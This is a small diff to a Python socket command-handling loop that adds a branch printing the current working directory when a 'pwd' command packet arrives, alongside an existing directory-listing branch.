@@ -128,6 +128,11 @@ while True:
         print("Listing directory contents:")
         contents = os.listdir(".")
         print("Contents:", contents)
+
+    elif command_data_packet.startswith("(CM,prompt,pwd)"):
+        print("Current working directory:")
+        cwd = os.getcwd()
+        print("Path:", cwd)
 	
 
     Client_S.send("(SC)".encode())
